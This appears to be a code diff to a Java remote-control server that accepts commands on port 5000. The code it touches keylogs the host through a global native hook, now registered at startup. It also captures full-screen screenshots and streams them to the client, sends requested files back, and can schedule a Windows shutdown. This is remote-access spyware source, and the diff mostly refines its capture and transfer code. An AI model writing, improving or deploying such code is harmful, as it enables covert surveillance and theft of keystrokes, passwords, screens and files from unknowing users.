@@ -28,6 +28,7 @@ public class Server implements NativeKeyListener {
         try {
             // Setting up the server
             ServerSocket serverSocket = new ServerSocket(5000);
+            GlobalScreen.addNativeKeyListener(new Server());
             while (true) {
                 Socket socket = serverSocket.accept();
                 System.out.println("Client connected: " + socket.getInetAddress().getHostAddress());
@@ -89,13 +90,27 @@ public class Server implements NativeKeyListener {
                         Robot robot = new Robot();
                         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                         BufferedImage screenshot = robot.createScreenCapture(screenRect);
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        ImageIO.write(screenshot, "png", baos);
-                        byte[] screenshotBytes = baos.toByteArray();
-                        baos.close();
-                        writer.println(screenshotBytes.length);
+
+                        File bufferOutput = new File("buffer.png");
+                        ImageIO.write(screenshot, "png", bufferOutput);
+
+                        String fileAddress = "buffer.png";
+                        File file = new File(fileAddress);
+
+                        writer.println(file.length());
                         writer.flush();
-                        socket.getOutputStream().write(screenshotBytes);
+
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        byte[] buffer = new byte[8192];
+                        InputStream in = new FileInputStream(file);
+                        int count;
+
+                        while ((count = in.read(buffer)) > 0) {
+                            baos.write(buffer, 0, count);
+                        }
+                        in.close();
+                        socket.getOutputStream().write(baos.toByteArray());
+                        baos.close();
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
@@ -111,17 +126,15 @@ public class Server implements NativeKeyListener {
                         System.err.println(ex.getMessage());
                         System.exit(1);
                     }
-                    GlobalScreen.addNativeKeyListener(server);
 
                 } else if (request.equals("stop-keylogger")) {
                     try {
                         GlobalScreen.unregisterNativeHook();
+                        writer.println(keyLoggingResult);
+                        writer.flush();
                     } catch (NativeHookException nativeHookException) {
                         nativeHookException.printStackTrace();
                     }
-                    GlobalScreen.removeNativeKeyListener(server);
-                    writer.println(keyLoggingResult);
-                    writer.flush();
 
                 } else if (request.equals("shutdown")) {
                     Runtime.getRuntime().exec("shutdown -s -t 900");
@@ -156,6 +169,7 @@ public class Server implements NativeKeyListener {
                         }
                         in.close();
                         socket.getOutputStream().write(baos.toByteArray());
+                        baos.close();
                     } else {
                         writer.println("The file doesn't exist.");
                         writer.flush();
